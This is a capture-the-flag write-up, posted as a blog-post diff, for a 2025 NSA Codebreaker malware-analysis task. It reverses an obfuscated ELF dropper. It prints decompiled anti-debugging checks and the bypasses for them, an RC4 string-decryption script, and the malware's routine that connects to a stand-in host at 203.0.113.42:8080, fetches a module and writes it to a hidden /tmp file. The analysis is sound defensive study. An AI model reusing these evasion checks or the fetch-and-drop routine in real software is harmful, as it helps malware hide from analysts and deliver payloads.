@@ -1,0 +1,307 @@
+---
+title: "Task 4 Writeup"
+description: "A writeup for the fourth task of the 2025 NSA Codebreaker Challenge"
+date: 1-6-2026
+slug: nsa-cbc-2025/task4
+tags: ['writeup', 'codebreaker', 'rev', '2025']
+authors: ["flocto"]
+image: "./hero.png"
+order: 4
+---
+import Callout from '@/components/Callout.astro'
+
+## Task 4 - Unpacking Insight - (Malware Analysis)
+<Callout title="Description" showVariant={false}>
+Once back at NSA the team contacts the NSA liaison at FBI to see if they have any information about what was discovered in the configuration data. FBI informs us that the facility registered to host that domain is on a watchlist for suspected criminal activity. With this tip, the FBI acquires a warrant and raids the location. Inside the facility, the server is discovered along with a suspect. The suspect is known to the FBI as a low-level malware actor. During questioning, they disclose that they are providing a service to host malware for various cybercrime groups, but recently they were contacted by a much more secretive and sophisticated customer. While they don't appear to know anything about who is paying for the service, they provide the FBI with the malware that was hosted.
+
+Back at NSA, you are provided with a copy of the file. There is a lot of high level interest in uncovering who facilitated this attack. The file appears to be obfuscated.
+
+You are tasked to work on de-obfuscating the file and report back to the team.
+
+Downloads:
+- obfuscated file (suspicious)
+
+Prompt:
+- Submit the file path the malware uses to write a file
+</Callout>
+
+This time, we're only given a single binary file named `suspicious`. Running the `file` command on it shows it's just a standard ELF 64-bit LSB executable, so I wonder what kind of obfuscation it could be using.
+
+```sh
+$ file suspicious
+suspicious: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3fc9729b05add2cba0bddd498f66c8b497060343, for GNU/Linux 3.2.0, strippe
+```
+
+At a first glance in Binary Ninja, this file is full of gibberish brainrot strings:
+![Gibberish strings in Binary Ninja](/img/writeups/2026/nsa-cbc/task4-brainrot1.png)
+![More gibberish strings in Binary Ninja](/img/writeups/2026/nsa-cbc/task4-brainrot2.png)
+
+It's a bit hard to figure out what's happening statically, so most of my original analysis was just staring in debugger and slowly stepping through each check. One thing that can significantly speed up the analysis though is the realization that the binary was created in a `memfd`, or an in-memory file descriptor (Recall the `pstree` dump from Task 3).
+
+This means we can look for `memfd_create` syscalls in the binary to find where the actual payload is being unpacked to. Searching for `memfd_create` in Binary Ninja, we find two calls immediately followed by `write`s, one of which is then followed by an `execve` and the other which is followed by a `dlopen` and `dlsym`:
+![memfd_create calls in Binary Ninja](/img/writeups/2026/nsa-cbc/task4-memfd-call1.png)
+![memfd_create calls in Binary Ninja](/img/writeups/2026/nsa-cbc/task4-memfd-call2.png)
+
+Actually the, `execve` one only occurs if a condition is met in the function with the `dlopen`/`dlsym` call, calling the other function instead. That measn this is the exact dropper function we want to analyze, and either case is just depending on whether we want to execute the payload directly or load it as a shared library.
+
+This function only gets called in `main` after a long series of anti-debugging checks and junk code, so we have to step through all of that first. After doing so, we reach the function and can step through it to see how the payload is unpacked.
+
+### Just be lazy and dynamically dump
+
+Rather than try to reverse all of the unpacking statically, I realized that if we could bypass all the anti-debugging checks, we could just dump the unpacked payload from memory immediately before it gets written to the `memfd`.
+
+We can do this fairly easily by just stepping through `main` and correctly setting the value of any registers that might cause an early exit. After a bit of trial and error, I was able to reach the unpacking function without any issues.
+
+The three main anti-debugging checks that needed to be bypassed were:
+```c collapse={2-32} collapse={35-81} collapse={84-91}
+uint64_t sigaction_setjmp_check() // 0x4035e0
+    struct tcbhead_t* tcb
+    uint64_t CANARY = tcb->stack_guard
+    struct sigaction act
+    act.__sigaction_handler.sa_handler = sub_4033f0
+    var_a0
+    sigemptyset(set: &var_a0)
+    act.sa_flags = 0
+    struct sigaction var_148
+    sigaction(sig: 0xb, &act, oact: &var_148)
+    (*"like the Ohio final boss in some skibidi toilet code review gone wrong. The tech "
+    "lead really pulled up and said "we need to refactor this legacy codebase" while I'm "
+    "sitting there mewing with maximum gyatt energy, trying not to gridd")[0].d = 0
+    
+    if (_setjmp(" in some skibidi toilet code review gone wrong. The tech lead really "
+    "pulled up and said "we need to refactor this legacy codebase" while I'm sitting "
+    "there mewing with maximum gyatt energy, trying not to griddy dance because this "
+    "man") == 0)
+        *nullptr = 0
+        trap(6)
+    
+    sigaction(sig: 0xb, act: &var_148, oact: nullptr)
+    int32_t rax_2
+    rax_2.b = (*"like the Ohio final boss in some skibidi toilet code review gone wrong. "
+    "The tech lead really pulled up and said "we need to refactor this legacy codebase" "
+    "while I'm sitting there mewing with maximum gyatt energy, trying not to gridd")[0]
+        .d == 0
+      
+    if (CANARY == tcb->stack_guard)
+        return zx.q(rax_1.b)
+    
+    __stack_chk_fail()
+
+uint64_t proc_self_status_check() // 0x403470
+    struct tcbhead_t* tcb
+    uint64_t CANARY = tcb->stack_guard
+    FILE* stream = nullptr
+    int16_t delim = 9
+    char* lineptr = nullptr
+    uint64_t n = 0
+    int32_t rbx_1
+    char* lineptr_1
+    
+    if (sub_4056a0(&stream, "r", "/proc/self/status") == 0)
+        char* s
+        char* i
+        
+        do
+            if (getline(&lineptr, &n, stream) == -1)
+                goto label_403513
+            
+            s = lineptr
+            i = strstr(s, "TracerPid")
+        while (i == 0)
+        
+        if (strtok(s, &delim) == 0)
+            goto label_403513
+        
+        char* rax_6 = strtok(s: nullptr, &delim)
+        
+        if (rax_6 == 0)
+            goto label_403513
+        
+        lineptr_1 = lineptr
+        rbx_1.b = *rax_6 != 0x30
+    else
+    label_403513:
+        lineptr_1 = lineptr
+        rbx_1 = 1
+    if (lineptr_1 != 0)
+        free(ptr: lineptr_1)
+    
+    FILE* fp = stream
+    if (fp != 0)
+        fclose(fp)
+    
+    
+    if (CANARY == tcb->stack_guard)
+        return zx.q(rbx_1)
+    
+    __stack_chk_fail()
+
+int32_t ptrace_check() // 0x403590
+    if (ptrace(request: PTRACE_TRACEME, 0, 1, 0) == -1)
+        int32_t result = *__errno_location()
+        
+        if (result == 1)
+            return result
+    
+    ptrace(request: PTRACE_DETACH, 0, 1, 0)
+    return 0
+```
+
+For the first check, we need to skip the `_setjmp` illegal memory access, since the debugger will catch the signal before the sigaction handler can run. For the second check and third check, we can just set the return values to indicate no debugger is present.
+
+Finally, once we get to the start of the `sub_405da0` function, we can simply dump the memory region out from the address in `rdi` with size in `rsi`, which is where the unpacked payload is stored before being written to the `memfd`.
+```sh {"buf": 10} {"buf length": 9} collapse={11-22}
+[ Legend: Modified register | Code | Heap | Stack | Writable | ReadOnly | None | RWX | String ]
+---- registers ----
+$rax   : 0x0000000000000000
+$rbx   : 0x00007fffffffcfd8  ->  0x00007fffffffd2b0  ->  0x552f632f746e6d2f '/mnt/c/Users/flocto/Documents/Cybersecurity/2025/NSACodebreaker/'...
+$rcx   : 0x0000000000008351
+$rdx   : 0x0000000000000000
+$rsp   : 0x00007fffffffcc88  ->  0x000055555555724f  ->  0xfffffac3850fc085
+$rbp   : 0x00007fffffffcd18  ->  0x00005555555a4da0  ->  0x55537c097dedda78
+$rsi   : 0x000000000000cee8
+$rdi   : 0x0000555555590850  ->  0x00010102464c457f
+$rip   : 0x0000555555559da0  ->  0x54415541fa1e0ff3
+$r8    : 0x000055555557c010  ->  0x0000000000020000
+$r9    : 0x0000000000008000
+$r10   : 0x00007fffffffcbe0  ->  0x00005555555a8f31  ->  0xd100000000000000
+$r11   : 0x000055555559d738  ->  0x000008040000003c
+$r12   : 0x00007fffffffcd28  ->  0x0000555555590850  ->  0x00010102464c457f
+$r13   : 0x0000000000000000
+$r14   : 0x00007ffff7fbc000  ->  0xe5894855fa1e0ff3
+$r15   : 0x000055555557c970  ->  0x6365735f7373622e '.bss_secure_buffer'
+$eflags: 0x246 [ident align vx86 resume nested overflow direction INTERRUPT trap sign ZERO adjust PARITY carry] [Ring=3]
+$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
+
+gef> dump memory inner_bin $rdi $rdi+$rsi
+gef> !file ./inner_bin
+./inner_bin: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=b589c307730668c476758058a3f21aca285d4874, stripped
+```
+
+### Analyzing the inner payload
+From the `dlsym` call earlier, we know we are looking for some function called `run` inside this shared library. Loading it in Binary Ninja, thankfully all of the symbols are still present, and we can easily find the `run` function.
+![run function in Binary Ninja](/img/writeups/2026/nsa-cbc/task4-run-func.png)
+
+The first thing the `run` function does is initialize some struct that clearly is using the RC4 Sbox:
+```cpp {"rc4 setup": 2-11}
+char* sub_407c8e(char* arg1, char* key, int64_t n)
+    for (int32_t i = 0; i s<= 0xff; i += 1)
+        arg1[sx.q(i)] = i.b
+    
+    uint32_t j = 0
+    
+    for (int32_t i_1 = 0; i_1 s<= 0xff; i_1 += 1)
+        uint32_t rdx_5 = zx.d(arg1[sx.q(i_1)]) + j + zx.d(key[modu.dp.q(0:(sx.q(i_1)), n)])
+        uint32_t rax_16 = rdx_5 s>> 0x1f u>> 0x18
+        j = zx.d(rdx_5.b + rax_16.b) - rax_16
+        std::swap(&arg1[sx.q(i_1)], &arg1[sx.q(j)])
+    
+    *(arg1 + 0x100) = 0
+    *(arg1 + 0x104) = 0
+    return arg1
+```
+
+This gets stored in the `run` function, which is then passed in to the other functions for decryption:
+```c {"decryption": 5}
+uint64_t sub_408574(struct cipher* cipher)
+    struct tcbhead_t* tcb
+    uint64_t CANARY = tcb->stack_guard
+    class std::string var_68
+    sub_407eff(&var_68, &data_40d580, 0x26, cipher)
+    class std::string path
+    std::filesystem::__cxx11...ring, std::filesystem::__cxx11::path>(&path, &var_68)
+    char rax = std::filesystem::exists(&path)
+    std::filesystem::__cxx11::path::~path()
+    int32_t rbx_1
+    
+    rbx_1 = rax == 0 ? 0 : 1
+    std::string::~string(this: &var_68)
+    
+    if (CANARY == tcb->stack_guard)
+        return zx.q(rbx_1)
+    
+    __stack_chk_fail()
+```
+
+We can extract all of the strings that get decrypted by `sub_407eff`, which is just standard RC4 decryption, and print it out statically to see what interesting strings are used:
+```python collapse={7-20} collapse={28-41}
+from Crypto.Cipher import ARC4
+key = b'skibidi'
+
+cipher = ARC4.new(key)
+
+enc = [
+    b'\xc7\x16u\xc6\x0f\xc7\x146\x16\xafL\x1d4\x01A\xba\xf9\"\xb9\xacB\xa6\xc7\x07\x00\t\xf7Y\xc9\xe1.cw\xf3\xa0q\xdb\x1f',
+    b'\xd28\xbdW\x18\x9e\xc17Z\xc9\xb7\xbf\x93\xda\xd3K\xa4',
+    b'\xd5b\xfbeJ\x1aF\x03\xbc\xf4\xaes\x9e',
+    b'\xb4\xb2\xe4\x8em',
+    b'x\xc8P\xa5\x17\x82z\xfd\xbb\x88',
+    b'\xf3)\'\xc9b:YE\x15_\xbd\xd9u\x84yz_\xac\x1e\xa30\x15\x0c\xfa\x87\x0c\xc6:&\xd9\x8b',
+    b'9',
+    b'MT&5',
+    b'S\xd9\xc6\xd8\t\x82\'\xcf\xa1\xde\x17\x8a',
+    b'\xd2 \x8asub\xcb[\xb5e\xda_t\xb1\xb5J\x19}W\x92',
+    b'\x10\xdb\xf5\x06\x99',
+    b'\xc4',
+    b'j\x19e\xf8\xd8\t\x0c\xd4\r[^\x1fx\x00\xe7\xee',
+    b'\\\xf8\x80=\xc8\x84\xfc\x82Z\xaa\x1b\x13\x9c\xb2'
+]
+
+for i, e in enumerate(enc):
+    dec = cipher.decrypt(e)
+    print(f'str{i}: {dec}')
+
+# Output:
+# str0: b'/opt/dafin/intel/ops_brief_redteam.pdf'
+# str1: b'DAFIN_SEC_PROFILE'
+# str2: b'/proc/cpuinfo'
+# str3: b'flags'
+# str4: b'hypervisor'
+# str5: b'systemd-detect-virt 2>/dev/null'
+# str6: b'r'
+# str7: b'none'
+# str8: b'203.0.113.42'
+# str9: b'GET /module HTTP/1.1'
+# str10: b'/tmp/'
+# str11: b'.'
+# str12: b'JoZ0To1QYoPN8y47'
+# str13: b'execute_module'
+```
+
+Inside of the last function called in `run`, the function attempts to connect to the HTTP server at str8 on port 8080, then sends the str9 GET request. If it recieves a response, it writes the response to a file whose path is the concatenation of str10 through str12.
+
+```c {"connect on str8:8080 ":9-11} {"str9 HTTP request": 13-19} ins={"str10-str12 ofstream creation": 20-30}
+if (fd s>= 0)
+    class std::string out
+    rc4_decrypt(&out, enc: &str8, enc_len: 0xc, cipher)
+    int64_t addr = 0
+    int64_t var_780_1 = 0
+    addr.w = 2
+    addr:2.w = htons(x: 8080)
+    int32_t rax_3
+    rax_3.b = inet_pton(af: 2, src: std::string::c_str(this: &out), dst: &addr:4) s<= 0
+    
+    if (rax_3.b == 0 && (connect(fd, &addr, len: 0x10) u>> 0x1f).b == 0)
+            void var_758
+            rc4_decrypt(out: &var_758, enc: &str9, enc_len: 0x14, cipher)
+            void var_628
+            std::operator+<char>(__lhs: &var_628, __rhs: &var_758)
+            std::string::operator=(this: &var_758, __str: &var_628)
+            std::string::~string(this: &var_628)
+            std::string::size_type len = std::string::length(this: &var_758)
+            send(fd, buf: std::string::c_str(this: &var_758), len, flags: 0)
+            class std::string var_738
+            rc4_decrypt(out: &var_738, enc: &str10, enc_len: 5, cipher)
+            class std::string var_718
+            rc4_decrypt(out: &var_718, enc: &str11, enc_len: 1, cipher)
+            class std::string var_6f8
+            rc4_decrypt(out: &var_6f8, enc: &str12, enc_len: 0x10, cipher)
+            std::operator+<char>(__res: &var_628, __lhs: &var_738, __rhs: &var_718)
+            void var_6d8
+            std::operator+<char>(__res: &var_6d8, __lhs: &var_628, __rhs2: &var_6f8)
+            std::string::~string(this: &var_628)
+            std::ofstream::ofstream(this: &var_628, __s: &var_6d8)
+```
+
+This gives us the full path the malware uses to write the file, which is `/tmp/` + `.` + `JoZ0To1QYoPN8y47` = `/tmp/.JoZ0To1QYoPN8y47`, the answer to submit for this task.
+
